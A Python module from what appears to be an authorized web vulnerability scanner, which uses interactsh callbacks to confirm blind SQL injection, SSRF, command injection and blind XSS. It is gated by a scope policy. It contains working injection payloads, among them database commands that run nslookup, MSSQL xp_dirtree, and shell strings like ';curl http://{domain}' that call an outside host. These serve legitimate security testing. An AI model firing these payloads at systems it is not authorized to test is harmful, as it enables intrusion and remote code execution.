"""
oob_engine.py — Out-of-Band Interaction Testing via interactsh
Detects blind SQLi, SSRF, RCE in async/deferred application flows
where error-based and time-based methods produce no in-band signal.

Flow:
  Phase 1  → start() → registers unique OOB domain
  Phase 2  → inject payloads into SSRF, SQLi, param mining
  End Ph2  → poll() → match DNS/HTTP/SMTP hits to payloads → Critical findings
"""

import asyncio
import hashlib
import hmac
import json
import os
import re
import shutil
import subprocess
import tempfile
import time
import uuid
from typing import Callable, Optional
from scope_policy import scope_policy

# ── Interactsh server options (public ProjectDiscovery servers) ───────────────
INTERACTSH_SERVERS = [
    "oast.fun",
    "oast.me",
    "oast.site",
    "interactsh.com",
]

# ── Context tags embedded in OOB subdomain for attribution ───────────────────
# Format:  {ctx}-{param_hash}.{unique_id}.oast.fun
# Example: ssrf-url-a3f2.c23b2la0.oast.fun
CTX_SSRF_PARAM  = "ssrf"
CTX_SQLI_BLIND  = "sqli"
CTX_RCE_PARAM   = "rce"
CTX_BLIND_XSS   = "bxss"
CTX_GENERIC     = "oob"


class OOBEngine:
    """
    Manages an interactsh-client subprocess and tracks payload-to-context mapping.
    Gracefully degrades if interactsh-client is not installed.
    """

    def __init__(self):
        self._proc:          Optional[asyncio.subprocess.Process] = None
        self._domain:        str   = ""
        self._short_id:      str   = ""
        self._output_file:   str   = ""
        self._payload_map:   dict  = {}   # subdomain_prefix → context dict
        self._signing_key:   bytes = os.getenv(
            "BURPOLLAMA_OOB_SIGNING_KEY", uuid.uuid4().hex).encode()
        self._available:     bool  = False
        self._interactions:  list  = []
        self._started:       bool  = False

        # ── v3.2: Continuous background polling state ─────────────────────────
        # Tracks line offsets already processed to avoid duplicate reporting
        self._reported_line_count: int             = 0
        # Asyncio background task handle
        self._bg_poller_task: Optional[asyncio.Task] = None
        # Injected by main.py so the poller can broadcast retroactive findings
        self._broadcast_fn                          = None
        self._scan_ref: Optional[dict]              = None
        self._scan_id:  str                         = ""

    # ── Lifecycle ──────────────────────────────────────────────────────────────

    async def start(self, log: Callable) -> bool:
        """
        Start interactsh-client and register a unique OOB domain.
        Returns True if started successfully, False if not available.
        """
        if scope_policy.config.emergency_stop or scope_policy.config.passive_only_mode or not scope_policy.config.oob_testing_enabled:
            log("[OOB] Disabled by ScopePolicy")
            self._available = False
            return False
        if not shutil.which("interactsh-client"):
            log("[OOB] interactsh-client not found — blind OOB testing disabled")
            log("[OOB] Install: go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest")
            self._available = False
            return False

        try:
            self._output_file = os.path.join(tempfile.gettempdir(),
                                              "burpollama_oob_{}.jsonl".format(
                                                  uuid.uuid4().hex[:8]))

            # Start interactsh-client — outputs unique domain then streams hits
            provider = os.getenv("BURPOLLAMA_OOB_PROVIDER", INTERACTSH_SERVERS[0])
            self._proc = await asyncio.create_subprocess_exec(
                "interactsh-client",
                "-server", provider,
                "-n", "1",
                "-json",
                "-o", self._output_file,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            # Read first few lines to extract the registered domain
            domain = await self._extract_domain(timeout=15)
            if not domain:
                log("[OOB] Failed to get OOB domain — blind testing disabled")
                await self.stop()
                return False

            self._domain    = domain
            self._short_id  = domain.split(".")[0][:8]   # first 8 chars for subdomain tags
            self._available = True
            self._started   = True
            log("[OOB] ✓ OOB domain registered: {}".format(domain))
            log("[OOB] Provider: {}".format(provider))
            log("[OOB] Payloads will use subdomains of: {}".format(domain))
            return True

        except Exception as e:
            log("[OOB] Start error: {}".format(e))
            self._available = False
            return False

    async def _extract_domain(self, timeout: int = 15) -> str:
        """Read stdout until we find the registered domain."""
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            try:
                line = await asyncio.wait_for(
                    self._proc.stdout.readline(), timeout=2.0
                )
                if not line:
                    break
                decoded = line.decode("utf-8", errors="ignore").strip()
                # interactsh outputs: "[INF] c23b2la0kl1krjcgpv2g.oast.fun"
                m = re.search(r'([a-z0-9]+\.[a-z0-9]+\.[a-z]+)', decoded)
                if m and "oast" in decoded or "interactsh" in decoded:
                    return m.group(1)
            except asyncio.TimeoutError:
                continue
        return ""

    async def stop(self):
        """Terminate the interactsh-client process."""
        if self._proc:
            try:
                self._proc.terminate()
                await asyncio.wait_for(self._proc.wait(), timeout=5)
            except Exception:
                pass
        # Cleanup output file
        if self._output_file and os.path.exists(self._output_file):
            try:
                os.remove(self._output_file)
            except Exception:
                pass

    # ── Payload generation ────────────────────────────────────────────────────

    def generate_payload(
        self,
        context: str,
        param: str = "",
        url: str = "",
        metadata: Optional[dict] = None,
    ) -> str:
        """
        Generate a unique OOB payload subdomain for a specific context.
        The subdomain encodes context and param so hits can be attributed.

        Returns full URL: http://ssrf-a3f2.c23b2la0.oast.fun/
        Returns empty string if OOB not available.
        """
        if not self._available or not self._domain:
            return ""
        ok, _ = scope_policy.validate_target(url or self._domain, action="oob")
        if not ok:
            return ""

        # Build a signed short identifier from param name for attribution.
        param_tag = re.sub(r'[^a-z0-9]', '', param.lower())[:6] or "x"
        ctx_tag   = re.sub(r'[^a-z0-9]', '', context.lower())[:8]
        nonce     = uuid.uuid4().hex[:6]
        sig       = self._sign_payload(ctx_tag, param_tag, nonce)
        prefix    = "{}-{}-{}-{}".format(ctx_tag, param_tag, nonce, sig)

        full_subdomain = "{}.{}".format(prefix, self._domain)
        payload_url    = "http://{}".format(full_subdomain)

        # Store mapping for attribution
        self._payload_map[prefix] = {
            "context":   context,
            "param":     param,
            "url":       url,
            "subdomain": full_subdomain,
            "timestamp": time.time(),
            "nonce":     nonce,
            "signature": sig,
            "signed":    True,
        }
        if metadata:
            self._payload_map[prefix].update(dict(metadata))

        return payload_url

    def get_sqli_payloads(self, param: str, url: str) -> list:
        """
        Generate blind SQLi OOB payloads for DNS-based exfiltration.
        These trigger DNS lookups when executed by the database server.
        """
        if not self._available:
            return []
        ok, _ = scope_policy.validate_target(url, action="oob")
        if not ok:
            return []

        param_tag = re.sub(r'[^a-z0-9]', '', param.lower())[:6] or "x"
        nonce     = uuid.uuid4().hex[:6]
        sig       = self._sign_payload("sqli", param_tag, nonce)
        oob_domain = "{}.{}".format("sqli-{}-{}-{}".format(param_tag, nonce, sig), self._domain)

        # Register in map
        prefix = oob_domain.split(".")[0]
        self._payload_map[prefix] = {
            "context": CTX_SQLI_BLIND, "param": param,
            "url": url, "subdomain": oob_domain, "timestamp": time.time(),
            "nonce": nonce, "signature": sig, "signed": True,
        }

        # DBMS-specific DNS exfiltration payloads
        return [
            # MySQL — load_file via UNC path (Windows) / DNS lookup trick
            ("MySQL-OOB",      "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -"),
            # MySQL — outfile to OOB
            ("MySQL-DNS",      "' UNION SELECT LOAD_FILE('\\\\\\\\{}\\\\.txt')-- -".format(oob_domain)),
            # PostgreSQL — COPY TO triggers DNS
            ("PostgreSQL-OOB", "'; COPY (SELECT '') TO PROGRAM 'nslookup {}';-- -".format(oob_domain)),
            # MSSQL — xp_dirtree DNS lookup
            ("MSSQL-OOB",      "'; EXEC master..xp_dirtree '\\\\\\\\{}\\\\share';-- -".format(oob_domain)),
            # Oracle — UTL_HTTP DNS lookup
            ("Oracle-OOB",     "' UNION SELECT UTL_HTTP.REQUEST('http://{}/') FROM dual-- -".format(oob_domain)),
        ]

    def annotate_payload(self, payload_url: str, metadata: dict) -> bool:
        """Attach request evidence to an already registered payload."""
        host = re.sub(r"^https?://", "", str(payload_url or "")).split("/", 1)[0]
        prefix = host.split(".", 1)[0]
        if prefix not in self._payload_map:
            return False
        self._payload_map[prefix].update(dict(metadata or {}))
        return True

    def get_ssrf_payload(self, param: str, url: str) -> str:
        """Generate SSRF OOB payload URL."""
        return self.generate_payload(CTX_SSRF_PARAM, param, url)

    def get_rce_payload(self, param: str, url: str) -> str:
        """Generate RCE OOB payload for parameter mining / command injection."""
        oob = self.generate_payload(CTX_RCE_PARAM, param, url)
        if not oob:
            return ""
        domain = oob.replace("http://", "")
        # Return both URL form and command injection form
        return oob

    def get_rce_commands(self, param: str, url: str) -> list:
        """Generate OOB command injection payloads."""
        if not self._available:
            return []
        oob = self.get_rce_payload(param, url)
        if not oob:
            return []
        domain = oob.replace("http://", "").rstrip("/")
        return [
            # Unix DNS lookup
            ";nslookup {}".format(domain),
            "$(nslookup {})".format(domain),
            "`nslookup {}`".format(domain),
            # Unix curl/wget
            ";curl http://{}".format(domain),
            "$(curl http://{})".format(domain),
            # Windows
            "&nslookup {}".format(domain),
            "|nslookup {}".format(domain),
        ]

    # ── Interaction polling ───────────────────────────────────────────────────

    async def poll_interactions(self, log: Callable, wait_secs: int = 12) -> list:
        """
        One-shot end-of-Phase-2 poll.
        Spec: 12-second propagation delay before reading interactions.
        Tracks file position via _reported_line_count so background
        poller never re-processes these entries.
        """
        if not self._available or not self._started:
            return []

        log("[OOB] Polling for interactions (waiting {}s)...".format(wait_secs))
        await asyncio.sleep(wait_secs)

        new_interactions = self._read_new_interactions()
        findings         = self._process_interactions(new_interactions, log)
        log("[OOB] Immediate poll: {} new interaction(s)".format(len(new_interactions)))
        return findings

    def register_background_context(
        self,
        scan_id:      str,
        broadcast_fn,           # async callable: broadcast(dict) → None
        scan_ref:     dict,     # reference to scans[scan_id] dict
    ):
        """
        Called by main.py after Phase 2 completes.
        Stores context so the background poller can emit retroactive findings.
        """
        self._scan_id      = scan_id
        self._broadcast_fn = broadcast_fn
        self._scan_ref     = scan_ref

    def start_background_poller(self, log: Callable):
        """
        Launch a non-blocking asyncio background task that continues polling
        the interactsh output every 30 seconds for up to 10 minutes after the
        scan enters COMPLETE state. Any delayed interactions are retroactively
        broadcast via WebSocket without blocking the primary pipeline.
        """
        if not self._available or not self._started:
            return
        if self._bg_poller_task and not self._bg_poller_task.done():
            return   # already running

        self._bg_poller_task = asyncio.create_task(
            self._background_poll_loop(log)
        )
        log("[OOB] Background poller started — will poll every 30s for up to 10min")

    async def _background_poll_loop(self, log: Callable):
        """
        Independent async task. Polls every 30 seconds for up to 10 minutes
        after the scan reaches COMPLETE. Retroactively broadcasts new findings.

        Design decisions:
        - Uses _reported_line_count to never re-process already-seen lines.
        - Stops cleanly if: 10-minute window expires, task is cancelled,
          or interactsh process has already been torn down.
        - Handles all exceptions internally — never propagates to caller.
        """
        POLL_INTERVAL_SECS = 30
        MAX_WINDOW_SECS    = 600   # 10 minutes
        elapsed            = 0
        import datetime

        try:
            while elapsed < MAX_WINDOW_SECS:
                # Wait for next poll interval
                await asyncio.sleep(POLL_INTERVAL_SECS)
                elapsed += POLL_INTERVAL_SECS

                if not self._available:
                    break

                # Check if scan has reached COMPLETE state
                if self._scan_ref and self._scan_ref.get("status") not in ("complete", "error"):
                    # Scan still running — wait longer before counting window
                    elapsed = max(0, elapsed - POLL_INTERVAL_SECS)
                    continue

                # Read only NEW lines since last read
                new_interactions = self._read_new_interactions()
                if not new_interactions:
                    continue

                log("[OOB] Background poll ({}/{}s): {} new interaction(s)".format(
                    elapsed, MAX_WINDOW_SECS, len(new_interactions)))

                findings = self._process_interactions(new_interactions, log)
                if not findings:
                    continue

                # Retroactively broadcast each finding
                if self._broadcast_fn and self._scan_id:
                    for f in findings:
                        import time as _time
                        f["id"]        = "OOB-BG-{}-{}".format(
                            int(_time.time() * 1000), abs(hash(f.get("url","x"))) % 9999)
                        f["timestamp"] = datetime.datetime.utcnow().isoformat()
                        f["source"]    = "oob-background"
                        f.setdefault("method",  "GET")
                        f.setdefault("triaged", False)
                        f.setdefault("verdict", "PASS")

                        try:
                            await self._broadcast_fn({"type": "finding", "data": f})
                            await self._broadcast_fn({"type": "log",
                                "scan_id": self._scan_id,
                                "entry": {
                                    "ts":    datetime.datetime.utcnow().strftime("%H:%M:%S"),
                                    "msg":   "[OOB Background] Delayed finding: {} — {}".format(
                                             f["vuln_type"], f.get("url","")[:60]),
                                    "level": "success",
                                }
                            })
                        except Exception as broadcast_err:
                            log("[OOB] Background broadcast error: {}".format(broadcast_err))

                log("[OOB] {} retroactive finding(s) broadcast".format(len(findings)))

        except asyncio.CancelledError:
            log("[OOB] Background poller cancelled")
        except Exception as e:
            log("[OOB] Background poller error: {}".format(e))
        finally:
            log("[OOB] Background poller stopped after {}s".format(elapsed))

    def _read_new_interactions(self) -> list:
        """
        Read ONLY lines not yet processed, updating the line-count cursor.
        Thread-safe at the line-read level — interactsh appends lines atomically.
        """
        interactions = []
        if not self._output_file or not os.path.exists(self._output_file):
            return []
        try:
            with open(self._output_file, "r") as fh:
                all_lines = fh.readlines()

            new_lines = all_lines[self._reported_line_count:]
            self._reported_line_count = len(all_lines)   # advance cursor

            for line in new_lines:
                line = line.strip()
                if not line:
                    continue
                try:
                    interactions.append(json.loads(line))
                except json.JSONDecodeError:
                    pass
        except Exception:
            pass
        return interactions

    def _process_interactions(self, interactions: list, log: Callable) -> list:
        """Convert raw interaction dicts into finding dicts."""
        findings = []
        for interaction in interactions:
            self._interactions.append(dict(interaction))
            protocol  = interaction.get("protocol", "unknown").upper()
            unique_id = interaction.get("unique-id", "")
            raw_req   = interaction.get("raw-request", "") or interaction.get("request", "")
            timestamp = interaction.get("timestamp", "")

            ctx = self._match_context(unique_id)
            if not ctx:
                ctx = self._match_context_from_request(raw_req)

            if ctx:
                findings.append(self._build_oob_finding(ctx, protocol, raw_req, timestamp))
            else:
                findings.append({
                    "vuln_type":   "Blind OOB Interaction — {}".format(protocol),
                    "severity":    "HIGH",
                    "confidence":  80,
                    "url":         "",
                    "description": "OOB {} interaction recorded — could not attribute to specific parameter.".format(protocol),
                    "evidence":    "Protocol: {} | ID: {} | Request: {}".format(
                        protocol, unique_id, raw_req[:200]),
                    "remediation": "Investigate all SSRF/SQLi/RCE candidates from this scan.",
                    "cwe":         "CWE-918",
                    "cvss":        7.5,
                    "source":      "oob-interaction",
                })
        return findings

    def _match_context(self, unique_id: str) -> Optional[dict]:
        """Match an interaction unique-id back to the payload that caused it."""
        for prefix, ctx in self._payload_map.items():
            if unique_id and (prefix in unique_id or unique_id in prefix):
                if not self._validate_context(prefix, ctx):
                    continue
                return ctx
        return None

    def _match_context_from_request(self, raw_request: str) -> Optional[dict]:
        """Try to match interaction from raw request host header."""
        for prefix, ctx in self._payload_map.items():
            if prefix in raw_request:
                if not self._validate_context(prefix, ctx):
                    continue
                return ctx
        return None

    def _sign_payload(self, ctx_tag: str, param_tag: str, nonce: str) -> str:
        msg = "{}:{}:{}".format(ctx_tag, param_tag, nonce).encode()
        return hmac.new(self._signing_key, msg, hashlib.sha256).hexdigest()[:8]

    def _validate_context(self, prefix: str, ctx: dict) -> bool:
        if not ctx.get("signed"):
            return True
        parts = prefix.split("-")
        if len(parts) < 4:
            return False
        expected = self._sign_payload(parts[0], parts[1], parts[2])
        return hmac.compare_digest(expected, parts[3]) and ctx.get("nonce") == parts[2]

    def _attribution_score(self, ctx: dict, protocol: str, raw_req: str) -> int:
        score = 50
        if ctx.get("signed"):
            score += 20
        if ctx.get("subdomain", "") and ctx.get("subdomain", "") in raw_req:
            score += 15
        if protocol.upper() in ("DNS", "HTTP", "HTTPS"):
            score += 10
        age = max(0, time.time() - float(ctx.get("timestamp", time.time())))
        if age <= 900:
            score += 5
        elif age > 86400:
            score -= 10
        return max(0, min(100, score))

    def _build_oob_finding(self, ctx: dict, protocol: str,
                            raw_req: str, timestamp: str) -> dict:
        """Build a Critical finding from a confirmed OOB interaction."""
        context_type = ctx.get("context", CTX_GENERIC)
        param        = ctx.get("param", "unknown")
        origin_url   = ctx.get("url", "")

        severity = "CRITICAL"
        exploitability_status = "confirmed"
        evidence_strength = "strong"
        false_positive_risk = "low"
        if context_type == CTX_SQLI_BLIND:
            vuln_type  = "Blind SQL Injection — OOB Confirmed (DNS)"
            cwe        = "CWE-89"
            cvss       = 9.8
            desc = ("Blind SQLi confirmed via OOB {} interaction. Parameter '{}' triggered "
                    "an out-of-band DNS/HTTP request to the interactsh server — "
                    "proves server-side SQL execution even without in-band response.".format(
                        protocol, param))
            remed = ("Use parameterized queries / prepared statements. "
                     "This is confirmed exploitable — prioritise immediately.")
        elif context_type == CTX_SSRF_PARAM:
            vuln_type  = "Blind SSRF — OOB Confirmed ({})".format(protocol)
            cwe        = "CWE-918"
            cvss       = 9.1
            desc = ("SSRF confirmed via OOB {} interaction. Parameter '{}' caused the server "
                    "to make an outbound connection to attacker-controlled infrastructure — "
                    "confirmed even in async/deferred processing pipelines.".format(protocol, param))
            remed = ("Validate and whitelist all outbound URLs server-side. "
                     "Block private/internal IP ranges. Use an outbound allow-list proxy.")
        elif context_type == CTX_RCE_PARAM:
            vuln_type  = "Remote Code Execution — OOB Confirmed ({})".format(protocol)
            cwe        = "CWE-78"
            cvss       = 10.0
            desc = ("RCE confirmed via OOB {} interaction. Parameter '{}' executed "
                    "an OS-level command that triggered a DNS/HTTP callback — "
                    "full command execution confirmed.".format(protocol, param))
            remed = "Never pass user input to OS commands. Use safe API calls. Patch immediately."
        elif context_type == CTX_BLIND_XSS:
            http_confirmed = protocol.upper() in ("HTTP", "HTTPS")
            severity = "HIGH"
            vuln_type = (
                "Blind XSS — OOB HTTP Callback Confirmed"
                if http_confirmed
                else "Blind XSS — DNS Interaction Needs Manual Validation"
            )
            cwe = "CWE-79"
            cvss = 8.7 if http_confirmed else 6.1
            exploitability_status = (
                "confirmed" if http_confirmed else "needs_manual_validation"
            )
            evidence_strength = "strong" if http_confirmed else "weak"
            false_positive_risk = "low" if http_confirmed else "high"
            desc = (
                "Blind XSS confirmed via an attributed HTTP callback. The stored "
                "payload in parameter '{}' was rendered and requested the unique "
                "OOB script URL.".format(param)
                if http_confirmed else
                "The Blind XSS payload caused a DNS interaction, but no HTTP script "
                "request was observed. Manual confirmation is required."
            )
            remed = (
                "Apply context-aware output encoding to all stored user input, "
                "sanitize rich content, and enforce a strict Content-Security-Policy."
            )
        else:
            vuln_type  = "Blind OOB Interaction — {}".format(protocol)
            cwe        = "CWE-918"
            cvss       = 8.0
            desc = ("OOB {} interaction confirmed from parameter '{}' — "
                    "server made outbound connection to attacker-controlled domain.".format(
                        protocol, param))
            remed = "Investigate and restrict outbound connections from this endpoint."

        evidence = (
            "OOB {} hit | param='{}' | domain='{}' | ts={} | request={}".format(
                protocol, param, ctx.get("subdomain", ""), timestamp, raw_req[:150]
            )
        )
        if context_type == CTX_BLIND_XSS and ctx.get("injection_request"):
            evidence += " | injection_request={}".format(
                str(ctx.get("injection_request", ""))[:1200]
            )

        return {
            "vuln_type":   vuln_type,
            "severity":    severity,
            "confidence":  self._attribution_score(ctx, protocol, raw_req),
            "url":         origin_url,
            "method":      ctx.get("method") or (
                "POST" if context_type == CTX_BLIND_XSS else "GET"
            ),
            "description": desc,
            "evidence":    evidence,
            "remediation": remed,
            "business_impact": (
                "Stored script execution in a support or administrative browser "
                "could expose privileged data or perform actions as that user."
                if context_type == CTX_BLIND_XSS else ""
            ),
            "cwe":         cwe,
            "cvss":        cvss,
            "source":      "oob-interaction",
            "oob_context": ctx,
            "exact_injection_request": ctx.get("injection_request", ""),
            "injected_payload": ctx.get("injected_payload", ""),
            "callback_attribution": {
                "score": self._attribution_score(ctx, protocol, raw_req),
                "signed_payload": bool(ctx.get("signed")),
                "nonce_validated": bool(ctx.get("nonce")),
                "delayed_seconds": round(max(0, time.time() - float(ctx.get("timestamp", time.time()))), 1),
            },
            "exploitability_status": exploitability_status,
            "evidence_strength": evidence_strength,
            "false_positive_risk": false_positive_risk,
            "redaction_status": "redacted",
            "oob_callback": {
                "protocol": protocol,
                "timestamp": timestamp,
                "request": raw_req[:1000],
                "nonce": ctx.get("bxss_nonce", ctx.get("nonce", "")),
            } if context_type == CTX_BLIND_XSS else {},
            "reproduction_steps": (
                [
                    "1. Start interactsh-client: interactsh-client -server oast.fun",
                    "2. Use the generated domain as the SSRF payload value",
                    "3. Send the request to {} with parameter {}={}".format(
                        origin_url,
                        param,
                        ctx.get("subdomain", ""),
                    ),
                    "4. Observe DNS/HTTP callback in interactsh output",
                    "5. Screenshot the callback as proof",
                ]
                if context_type == CTX_SSRF_PARAM else (
                    [
                        "Submit the recorded Blind XSS injection request to the authorized test endpoint.",
                        "Wait for the deferred content to be reviewed or rendered.",
                        "Observe the attributed HTTP callback containing the unique bxss path.",
                    ]
                    if context_type == CTX_BLIND_XSS else []
                )
            ),
        }

    # ── Properties ────────────────────────────────────────────────────────────

    @property
    def available(self) -> bool:
        return self._available

    @property
    def domain(self) -> str:
        return self._domain

    @property
    def payload_count(self) -> int:
        return len(self._payload_map)


    # ── Fix 5 (v3.4): OOB Session Persistence ────────────────────────────────

    def export_session_state(self, scan_id: str = "") -> dict:
        """
        Export the interactsh session state to a dict for SQLite persistence.
        Allows re-polling days or weeks after the pipeline has shut down,
        catching delayed cron-job or batch-processor OOB callbacks.
        """
        return {
            "scan_id":            scan_id,
            "domain":             self._domain,
            "short_id":           self._short_id,
            "output_file":        self._output_file,
            "payload_map":        self._payload_map,
            "reported_line_count":self._reported_line_count,
            "exported_at":        __import__("datetime").datetime.utcnow().isoformat(),
        }

    def save_session_to_db(self, scan_id: str = "") -> bool:
        """
        Persist OOB session state to ~/.burpollama/oob_sessions.db
        so resume-poll.py can re-poll after the pipeline has shut down.
        """
        import sqlite3, json as _json, os as _os
        db_dir  = _os.path.expanduser("~/.burpollama")
        db_path = _os.path.join(db_dir, "oob_sessions.db")
        try:
            _os.makedirs(db_dir, exist_ok=True)
            state = self.export_session_state(scan_id)
            with sqlite3.connect(db_path) as conn:
                conn.execute("""
                    CREATE TABLE IF NOT EXISTS oob_sessions (
                        scan_id     TEXT PRIMARY KEY,
                        domain      TEXT,
                        state_json  TEXT,
                        saved_at    TEXT,
                        status      TEXT DEFAULT 'active'
                    )""")
                conn.execute("""
                    INSERT OR REPLACE INTO oob_sessions
                      (scan_id, domain, state_json, saved_at, status)
                    VALUES (?,?,?,?,?)
                """, (
                    scan_id or self._short_id,
                    self._domain,
                    _json.dumps(state),
                    state["exported_at"],
                    "active",
                ))
            print("[OOB] Session saved to {}".format(db_path))
            return True
        except Exception as e:
            print("[OOB] Session save error: {}".format(e))
            return False

    @classmethod
    def load_session_from_db(cls, scan_id: str, db_path: str = None):
        """
        Load a saved OOB session for offline re-polling via resume-poll.py.
        Returns a restored OOBEngine instance (no subprocess — polls file only).
        """
        import sqlite3, json as _json, os as _os
        if db_path is None:
            db_path = _os.path.expanduser("~/.burpollama/oob_sessions.db")
        if not _os.path.exists(db_path):
            print("[OOB] No sessions DB found at {}".format(db_path))
            return None
        try:
            with sqlite3.connect(db_path) as conn:
                row = conn.execute(
                    "SELECT state_json FROM oob_sessions WHERE scan_id=?",
                    (scan_id,)
                ).fetchone()
            if not row:
                print("[OOB] Scan ID '{}' not found in sessions DB".format(scan_id))
                return None
            state = _json.loads(row[0])
            instance = cls()
            instance._domain              = state.get("domain", "")
            instance._short_id            = state.get("short_id", "")
            instance._output_file         = state.get("output_file", "")
            instance._payload_map         = state.get("payload_map", {})
            instance._reported_line_count = state.get("reported_line_count", 0)
            instance._available           = bool(instance._domain)
            instance._started             = False   # no subprocess
            print("[OOB] Session loaded: domain={} payloads={}".format(
                instance._domain, len(instance._payload_map)))
            return instance
        except Exception as e:
            print("[OOB] Session load error: {}".format(e))
            return None


# ── Module-level singleton ────────────────────────────────────────────────────
oob = OOBEngine()
